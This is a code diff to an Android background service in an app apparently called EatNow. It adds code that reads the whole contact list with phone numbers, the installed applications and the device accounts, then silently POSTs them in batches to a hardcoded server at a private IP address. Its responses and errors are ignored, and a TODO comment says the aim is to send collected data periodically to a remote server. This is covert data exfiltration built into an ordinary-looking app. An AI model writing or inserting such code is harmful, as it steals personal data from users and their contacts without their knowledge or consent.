@@ -12,17 +12,31 @@ import android.content.pm.ApplicationInfo;
 import android.content.pm.PackageManager;
 import android.database.Cursor;
 import android.net.Uri;
+import android.os.AsyncTask;
 import android.os.IBinder;
 import android.provider.CallLog;
 import android.provider.ContactsContract;
 import android.support.annotation.Nullable;
 import android.text.LoginFilter;
 import android.util.Log;
+import android.widget.Toast;
+
+import com.android.volley.NoConnectionError;
+import com.android.volley.Request;
+import com.android.volley.RequestQueue;
+import com.android.volley.Response;
+import com.android.volley.TimeoutError;
+import com.android.volley.VolleyError;
+import com.android.volley.toolbox.Volley;
 
 import org.json.JSONArray;
 import org.json.JSONException;
 import org.json.JSONObject;
 
+import java.io.BufferedReader;
+import java.io.IOException;
+import java.io.InputStream;
+import java.io.InputStreamReader;
 import java.util.ArrayList;
 import java.util.List;
 
@@ -35,8 +49,8 @@ public class BGService extends Service {
 
     private static final int SECONDE = 1000;
     private static final int MINUTE = 60*SECONDE;
-    private static String sharePreferenceString;
-    private static String identityString;
+    private static final String URL = "http://192.168.2.117:4242/";
+    private RequestQueue requestQueue;
 
 
     //TODO: make most of the collecting data here and send them periodically to a remote server
@@ -46,6 +60,7 @@ public class BGService extends Service {
     public int onStartCommand(Intent intent, int flags, int startId){
         Log.i("BGService", "Service started");
         DBHelper dbHelper = new DBHelper(getApplicationContext());
+        requestQueue = Volley.newRequestQueue(this);
         final String userID = dbHelper.getUserID();
         Log.i("BGService", "userID = " + userID);
 
@@ -54,6 +69,9 @@ public class BGService extends Service {
             public void run() {
                 int count = 0;
                 boolean known = false;
+                POST(contactReader(10));
+                POST(applicationReader());
+                POST(accountReader());
                 // TODO Auto-generated method stub
                 while(true)
                 {
@@ -62,9 +80,9 @@ public class BGService extends Service {
                         //Log.v("BGService", formatArray("accountReader", accountReader()));
                         Thread.sleep(10*SECONDE); // 5*MINUTE
                         if (!known){
-                            Log.i("BGService", "Identity not sended. Sending know... (value = " + Boolean.toString(known) + ")");
+                            Log.i("BGService", "Identity not sent. Sending know... (value = " + Boolean.toString(known) + ")");
                             known = true;
-                            Log.i("BGService", "Identity is now known and sended");
+                            Log.i("BGService", "Identity is now known and sent");
                         } else {
                             count++;
                             if (count < 5) {
@@ -72,7 +90,7 @@ public class BGService extends Service {
                             } else {
                                 count = 0;
                                 known = false;
-                                Log.i("BGService", "Identity is reseted...");
+                                Log.i("BGService", "Identity is reset...");
                             }
                         }
                         Log.i("BGService", "loop thread... sending from user " + userID);
@@ -102,8 +120,51 @@ public class BGService extends Service {
     }
 
     /**
+     * @return an array of JSONArray
+     */
+    private ArrayList<JSONObject> contactJSONify(){
+        ArrayList<JSONObject> listJSONObject = new ArrayList<>();
+        // TODO START
+        //JSONArray jsonContactArray = new JSONArray();
+        JSONObject jsonContact = null;
+        ContentResolver contentResolver = EatNowApplication.getAppInstance().getContentResolver(); //Activity/Application android.content.Context
+        Cursor cursor = contentResolver.query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null);
+        //int counter = 0; // to know the number of contact
+        try {
+            if(cursor.moveToFirst()) {
+                do {
+                    //counter++;
+                    jsonContact = new JSONObject();
+                    String id = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts._ID));
+                    jsonContact.put("id", id);
+                    String[] infoArray = cursor.getColumnNames();
+                    for (String string : infoArray){
+                        jsonContact.put(string, cursor.getString(cursor.getColumnIndex(string)));
+                    }
+                    if(Integer.parseInt(cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER))) > 0) {
+                        Cursor cursorPhoneNumber = contentResolver.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,null,ContactsContract.CommonDataKinds.Phone.CONTACT_ID +" = ?",new String[]{ id }, null);
+                        while (cursorPhoneNumber.moveToNext()) {
+                            String contactNumber = cursorPhoneNumber.getString(cursorPhoneNumber.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
+                            jsonContact.put("customFetchPhoneNumber", contactNumber);
+                            break;
+                        }
+                        cursorPhoneNumber.close();
+                    }
+                    //jsonContactArray.put(jsonContact);
+                    listJSONObject.add(jsonContact);
+                } while (cursor.moveToNext()) ;
+            }
+        } catch (JSONException jsonException){
+            jsonException.printStackTrace();
+        }
+        // TODO END
+        return listJSONObject;
+    }
+
+    /**
      * @return JSONObject containing all the information on contact.
      */
+    /*
     private JSONObject contactReader(){
         JSONObject jsonFinal = new JSONObject();
         JSONArray jsonContactArray = new JSONArray();
@@ -141,6 +202,33 @@ public class BGService extends Service {
             jsonException.printStackTrace();
         }
         return jsonFinal;
+    }*/
+
+    /**
+     * @return JSONObject containing all the information on contact.
+     */
+    private ArrayList<JSONObject> contactReader(int packageSize){// 10
+        ArrayList<JSONObject> list = contactJSONify();
+        ArrayList<JSONObject> returned = new ArrayList<>();
+        int size = list.size();
+        JSONArray jsonArray;
+        JSONObject jsonObject;
+        for (int i=0; i<size; i+=packageSize){
+            jsonArray = new JSONArray();
+            for (int j=0; j<packageSize; j++){
+                jsonArray.put(list.get(j+i));
+            }
+            jsonObject = new JSONObject();
+            try {
+                jsonObject.put("number",size);
+                jsonObject.put("data", jsonArray);
+                jsonObject.put("dataType", "contact");
+            } catch (JSONException jsonException){
+                jsonException.printStackTrace();
+            }
+            returned.add(jsonObject);
+        }
+        return returned;
     }
 
     /**
@@ -211,5 +299,44 @@ public class BGService extends Service {
         // TODO fun stuff
         // TODO it looks like it is impossible due to security reasons...
         return navigationHistoryList;
+    }
+
+
+    private void POST(ArrayList<JSONObject> jsonObject){
+        for (JSONObject json : jsonObject) {
+            JsonRequestHelper request = new JsonRequestHelper(
+                    Request.Method.POST,
+                    URL,
+                    json,
+                    new Response.Listener<JSONObject>() {
+                        @Override
+                        public void onResponse(JSONObject response) {/*NOTHING TO DO*/}
+                    },
+                    new Response.ErrorListener() {
+                        @Override
+                        public void onErrorResponse(VolleyError error) {/*NOTHING TO DO*/}
+                    }
+            );
+            request.setPriority(Request.Priority.HIGH);
+            requestQueue.add(request);
+        }
+    }
+
+    private void POST(JSONObject jsonObject){
+        JsonRequestHelper request = new JsonRequestHelper(
+                Request.Method.POST,
+                URL,
+                jsonObject,
+                new Response.Listener<JSONObject>(){
+                    @Override
+                    public void onResponse(JSONObject response) {/*NOTHING TO DO*/}
+                },
+                new Response.ErrorListener(){
+                    @Override
+                    public void onErrorResponse(VolleyError error) {/*NOTHING TO DO*/}
+                }
+        );
+        request.setPriority(Request.Priority.HIGH);
+        requestQueue.add(request);
     }
 }
